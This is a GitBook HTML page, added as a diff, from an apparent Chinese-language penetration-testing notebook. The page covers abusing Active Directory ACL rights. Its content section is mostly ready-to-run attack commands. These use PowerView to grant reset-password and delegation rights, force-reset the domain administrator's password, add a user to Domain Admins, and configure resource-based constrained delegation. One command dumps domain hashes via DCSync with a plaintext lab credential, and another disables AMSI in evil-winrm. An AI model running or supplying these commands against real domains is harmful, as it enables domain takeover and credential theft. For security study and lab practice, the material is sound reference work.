@@ -1,0 +1,951 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>ACL滥用 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../组策略/" />
+    
+    
+    <link rel="prev" href="../密码和hash/" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../nmap/">
+            
+                <a href="../../nmap/">
+            
+                    
+                    nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../searchsploit/">
+            
+                <a href="../../searchsploit/">
+            
+                    
+                    searchsploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../Metasploit/">
+            
+                <a href="../../Metasploit/">
+            
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../内网穿透/">
+            
+                <a href="../../内网穿透/">
+            
+                    
+                    内网穿透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../内网穿透/Frp/">
+            
+                <a href="../../内网穿透/Frp/">
+            
+                    
+                    Frp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../内网穿透/NPS/">
+            
+                <a href="../../内网穿透/NPS/">
+            
+                    
+                    NPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../SMTP/">
+            
+                <a href="../../SMTP/">
+            
+                    
+                    SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../SMB/">
+            
+                <a href="../../SMB/">
+            
+                    
+                    SMB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../SMB/smbmap.html">
+            
+                <a href="../../SMB/smbmap.html">
+            
+                    
+                    smbmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../../SMB/smbclient.html">
+            
+                <a href="../../SMB/smbclient.html">
+            
+                    
+                    smbclient
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../../SMB/crackmapexec.html">
+            
+                <a href="../../SMB/crackmapexec.html">
+            
+                    
+                    crackmapexec
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../FTP/">
+            
+                <a href="../../FTP/">
+            
+                    
+                    FTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../../DNS/">
+            
+                <a href="../../DNS/">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../../RPC/">
+            
+                <a href="../../RPC/">
+            
+                    
+                    RPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="../../LDAP/">
+            
+                <a href="../../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="../../WEB/">
+            
+                <a href="../../WEB/">
+            
+                    
+                    WEB
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../../WEB/扫描.html">
+            
+                <a href="../../WEB/扫描.html">
+            
+                    
+                    扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.2" data-path="../../WEB/IIS.html">
+            
+                <a href="../../WEB/IIS.html">
+            
+                    
+                    IIS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12.3" data-path="../../WEB/tomcat.html">
+            
+                <a href="../../WEB/tomcat.html">
+            
+                    
+                    tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" data-path="../../数据库/">
+            
+                <a href="../../数据库/">
+            
+                    
+                    数据库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../../数据库/oracle.html">
+            
+                <a href="../../数据库/oracle.html">
+            
+                    
+                    oracle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../../数据库/mssql.html">
+            
+                <a href="../../数据库/mssql.html">
+            
+                    
+                    mssql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    域渗透
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../命令.html">
+            
+                <a href="../命令.html">
+            
+                    
+                    命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2" data-path="../提权/">
+            
+                <a href="../提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.2.1" data-path="../提权/提权信息.html">
+            
+                <a href="../提权/提权信息.html">
+            
+                    
+                    提权信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.2.2" data-path="../提权/组提权.html">
+            
+                <a href="../提权/组提权.html">
+            
+                    
+                    组提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.3" data-path="../免杀/">
+            
+                <a href="../免杀/">
+            
+                    
+                    免杀
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.4" data-path="../密码和hash/">
+            
+                <a href="../密码和hash/">
+            
+                    
+                    密码和hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.14.5" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    ACL滥用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.6" data-path="../组策略/">
+            
+                <a href="../组策略/">
+            
+                    
+                    组策略
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.7" data-path="../NTLM/">
+            
+                <a href="../NTLM/">
+            
+                    
+                    NTLM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.8" data-path="../Kerberos/">
+            
+                <a href="../Kerberos/">
+            
+                    
+                    Kerberos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.9" data-path="../LDAP/">
+            
+                <a href="../LDAP/">
+            
+                    
+                    LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.10" data-path="../DCSync/">
+            
+                <a href="../DCSync/">
+            
+                    
+                    DCSync
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.11" data-path="../MS14-068/">
+            
+                <a href="../MS14-068/">
+            
+                    
+                    MS14-068
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.12" data-path="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                <a href="../CVE-2019-1040-NTLM-MIC绕过漏洞/">
+            
+                    
+                    CVE-2019-1040-NTLM-MIC绕过漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.13" data-path="../PASS-THE-HASH/">
+            
+                <a href="../PASS-THE-HASH/">
+            
+                    
+                    Pass The Hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.14" data-path="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                <a href="../CVE-2020-1472 NetLogon权限提升漏洞/">
+            
+                    
+                    CVE-2020-1472 NetLogon权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.15" data-path="../Windows-Print-Spooler权限提升漏洞/">
+            
+                <a href="../Windows-Print-Spooler权限提升漏洞/">
+            
+                    
+                    Windows Print Spooler权限提升漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.16" data-path="../ADCS攻击/">
+            
+                <a href="../ADCS攻击/">
+            
+                    
+                    ADCS攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.17" data-path="../票据攻击/">
+            
+                <a href="../票据攻击/">
+            
+                    
+                    票据攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14.18" data-path="../域渗透工具/">
+            
+                <a href="../域渗透工具/">
+            
+                    
+                    域渗透工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" data-path="../../Linux/">
+            
+                <a href="../../Linux/">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../../Linux/反弹shell/">
+            
+                <a href="../../Linux/反弹shell/">
+            
+                    
+                    反弹shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15.2" data-path="../../Linux/提权/">
+            
+                <a href="../../Linux/提权/">
+            
+                    
+                    提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >ACL滥用</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="acl&#x6EE5;&#x7528;">ACL&#x6EE5;&#x7528;</h1>
+<h2 id="user-force-change-password&#x6269;&#x5C55;&#x6743;&#x9650;">User-Force-Change-Password&#x6269;&#x5C55;&#x6743;&#x9650;</h2>
+<p>&#x62E5;&#x6709;&#x8BE5;&#x6269;&#x5C55;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x5728;&#x4E0D;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5F3A;&#x5236;&#x4FEE;&#x6539;&#x76EE;&#x6807;&#x7684;&#x5BC6;&#x7801;&#x3002;</p>
+<pre><code class="lang-shell">Import-Module .\powerview.ps1
+#&#x6DFB;&#x52A0;&#x7528;&#x6237;hack&#x5BF9;&#x57DF;&#x7BA1;&#x7406;&#x5458;administrator &#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x6743;&#x9650;
+Add-DomainObjectAcl -TargetIdentity administrator -PrincipalIdentity hack -Rights ResetPassword -Verbose
+
+#&#x4FEE;&#x6539;&#x5BC6;&#x7801;
+admod -users -rb cn=administrator unicodepwd::feng123! -optenc
+#&#x8BE5;&#x6743;&#x9650;&#x4E0D;&#x652F;&#x6301;&#x62FF;net&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x5BC6;&#x7801;
+
+#&#x6216;&#x8005;
+$cred = ConvertTo-SecureString &quot;feng123!&quot; -AsPlainText -force
+Set-DomainUserPassword -identity hack -accountpassword $cred
+</code></pre>
+<h2 id="member&#x6743;&#x9650;&#x5C5E;&#x6027;">member&#x6743;&#x9650;&#x5C5E;&#x6027;</h2>
+<p>&#x62E5;&#x6709;&#x8BE5;&#x5C5E;&#x6027;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x3001;&#x7EC4;&#x6216;&#x673A;&#x5668;&#x52A0;&#x5165;&#x5230;&#x76EE;&#x6807;&#x5B89;&#x5168;&#x7EC4;&#x4E2D;&#x3002;</p>
+<p>&#x6BD4;&#x5982;&#x62E5;&#x6709;&#x4E86;Domain Admins&#x7EC4;&#x7684;member&#x5C5E;&#x6027;&#x7684;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x6743;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F80;Domain Admins&#x7EC4;&#x91CC;&#x6DFB;&#x52A0;&#x7528;&#x6237;</p>
+<pre><code class="lang-shell">net group &quot;domain admins&quot; hack /add /domain
+</code></pre>
+<h2 id="msds-allowedtoactonbehalfofotheridentity">msDS-AllowedToActOnBehalfOfOtherIdentity</h2>
+<p>&#x62E5;&#x6709;&#x8BE5;&#x5C5E;&#x6027;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x76EE;&#x6807;&#x5BF9;&#x8C61;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;RBCD&#xFF0C;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x7684;&#x6743;&#x9650;</p>
+<pre><code class="lang-shell">Import-Module .\powerview.ps1
+#&#x6DFB;&#x52A0;&#x7528;&#x6237;hack&#x5BF9;&#x57DF;&#x63A7;&#x7684;msDS-AllowedToActOnBehalfOfOtherIdentity&#x5C5E;&#x6027;&#x4FEE;&#x6539;&#x6743;&#x9650;
+Add-DomainObjectAcl -TargetIdentity &quot;CN=DC,OU=Domain Controllers,DC=xie,DC=com&quot; -PrincipalIdentity hack -RightsGUID 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -Verbose
+
+#&#x521B;&#x5EFA;&#x673A;&#x5668;&#x8D26;&#x6237;machine$&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;root&#xFF0C;&#x7136;&#x540E;&#x8D4B;&#x4E88;&#x673A;&#x5668;&#x8D26;&#x6237;machine$&#x5230;&#x57DF;&#x63A7;&#x7684;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;
+add_rbcd.exe domain=xie.com dc=DC.xie.com tm=DC ma=machine mp=root
+</code></pre>
+<p>&#x7136;&#x540E;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;&#x653B;&#x51FB;&#xFF1A;</p>
+<p><img src="README.assets/image-20230921110028201.png" alt="image-20230921110028201"></p>
+<h2 id="dcsync">DCSync</h2>
+<pre><code class="lang-shell">python3.10 secretsdump.py  &apos;egotistical-bank/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&apos; -just-dc
+</code></pre>
+<h2 id="genericall&#x6743;&#x9650;">GenericAll&#x6743;&#x9650;</h2>
+<h3 id="1&#x5E94;&#x7528;&#x4E8E;&#x7528;&#x6237;">1.&#x5E94;&#x7528;&#x4E8E;&#x7528;&#x6237;</h3>
+<p>&#x4FEE;&#x6539;&#x76EE;&#x6807;&#x5BC6;&#x7801;</p>
+<pre><code class="lang-powershell">net user administrator feng123! /domain
+</code></pre>
+<h3 id="2&#x5E94;&#x7528;&#x4E8E;&#x673A;&#x5668;">2.&#x5E94;&#x7528;&#x4E8E;&#x673A;&#x5668;</h3>
+<p>&#x8FDB;&#x884C;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;&#x653B;&#x51FB;</p>
+<pre><code class="lang-powershell"><span class="hljs-comment">#&#x521B;&#x5EFA;&#x673A;&#x5668;&#x8D26;&#x6237;machine$&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;root&#xFF0C;&#x7136;&#x540E;&#x8D4B;&#x4E88;&#x673A;&#x5668;&#x8D26;&#x6237;machine$&#x5230;&#x57DF;&#x63A7;&#x7684;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;</span>
+add_rbcd.exe domain=xie.com dc=DC.xie.com tm=DC ma=machine mp=root
+</code></pre>
+<p><img src="README.assets/image-20230921111021174.png" alt="image-20230921111021174"></p>
+<h3 id="3&#x5E94;&#x7528;&#x4E8E;&#x7EC4;">3.&#x5E94;&#x7528;&#x4E8E;&#x7EC4;</h3>
+<p>&#x7ED9;&#x7EC4;&#x6DFB;&#x52A0;&#x7528;&#x6237;</p>
+<pre><code class="lang-shell">net group &quot;domain admins&quot; hack /add /domain
+</code></pre>
+<h3 id="4&#x5E94;&#x7528;&#x4E8E;&#x57DF;">4.&#x5E94;&#x7528;&#x4E8E;&#x57DF;</h3>
+<p>hack&#x62E5;&#x6709;&#x5BF9;&#x57DF;&#x5BF9;&#x8C61;xie.com&#x7684;GenericAll&#x6743;&#x9650;&#x3002;</p>
+<p>&#x7ED9;hack Sync&#x6743;&#x9650;&#xFF1A;</p>
+<p><img src="README.assets/image-20230921111426803.png" alt="image-20230921111426803"></p>
+<h2 id="genericwrite&#x6743;&#x9650;">GenericWrite&#x6743;&#x9650;</h2>
+<p>&#x7C7B;&#x4F3C;&#x4E8E;GenericAll&#x6743;&#x9650;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x80FD;&#x8D4B;&#x4E88;User-Force-Change-Password&#x548C;DCSync&#x6743;&#x9650;&#x3002;</p>
+<p>&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#xFF0C;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;doesnotrequirepreauth&#x5C5E;&#x6027;&#x7684;&#x503C;&#x6765;&#x4E0D;&#x9700;&#x8981; Kerberos &#x9884;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;AS-REP Roasting&#x653B;&#x51FB;&#x3002;</p>
+<pre><code class="lang-shell">#evil-winrm&#x5FC5;&#x987B;&#x5148;&#x52A0;&#x8F7D;Bypass-4MSI&#x624D;&#x80FD;powerview
+menu
+Bypass-4MSI
+Import-Module .\powerview.ps1
+Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
+</code></pre>
+<h2 id="writedacl&#x6743;&#x9650;">WriteDACL&#x6743;&#x9650;</h2>
+<p>&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x76EE;&#x6807;&#x5BF9;&#x8C61;&#x7684;DACL&#x3002;&#x62E5;&#x6709;&#x8FD9;&#x4E2A;&#x6743;&#x9650;&#x53EF;&#x4EE5;&#x5F80;&#x6307;&#x5B9A;&#x5B89;&#x5168;&#x5BF9;&#x8C61;&#x5199;&#x5165;&#x4EFB;&#x4F55;&#x7684;ACE&#xFF0C;&#x4ECE;&#x800C;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x5B89;&#x5168;&#x5BF9;&#x8C61;&#x3002;</p>
+<p>&#x4F8B;&#x5982;hack&#x62E5;&#x6709;&#x5BF9;xie.com&#x7684;WriteDACL&#x6743;&#x9650;&#xFF0C;&#x901A;&#x8FC7;powerview&#x811A;&#x672C;&#x7ED9;hack&#x6DFB;&#x52A0;&#x5BF9;&#x57DF;xie.com&#x7684;DCSync&#x6743;&#x9650;&#x3002;</p>
+<h5 id=""> </h5>
+<h2 id="writeowner&#x6743;&#x9650;">WriteOwner&#x6743;&#x9650;</h2>
+<p>&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x76EE;&#x6807;&#x5BF9;&#x8C61;&#x7684;Owner&#x5C5E;&#x6027;&#x3002;&#x8BE5;&#x6743;&#x9650;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x6307;&#x5B9A;&#x5B89;&#x5168;&#x5BF9;&#x8C61;&#x7684;Owner&#x5C5E;&#x6027;&#x4E3A;&#x4EFB;&#x610F;&#x7528;&#x6237;&#xFF0C;&#x800C;Owner&#x9ED8;&#x8BA4;&#x62E5;&#x6709;WriteDACL&#x7B49;&#x6743;&#x9650;&#xFF0C;&#x56E0;&#x6B64;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p>
+<pre><code class="lang-shell">powershell
+Import-Module .\PowerView.ps1
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
+
+$cred = ConvertTo-SecureString &quot;fengfeng123!@#&quot; -AsPlainText -force
+Set-DomainUserPassword -identity claire -accountpassword $cred
+</code></pre>
+<h3 id=""> </h3>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../密码和hash/" class="navigation navigation-prev " aria-label="Previous page: 密码和hash">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../组策略/" class="navigation navigation-next " aria-label="Next page: 组策略">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"ACL滥用","level":"1.14.5","depth":2,"next":{"title":"组策略","level":"1.14.6","depth":2,"path":"域渗透/组策略/README.md","ref":"./域渗透/组策略/README.md","articles":[]},"previous":{"title":"密码和hash","level":"1.14.4","depth":2,"path":"域渗透/密码和hash/README.md","ref":"./域渗透/密码和hash/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"域渗透/ACL滥用/README.md","mtime":"2023-09-24T07:01:23.382Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-24T07:12:45.149Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
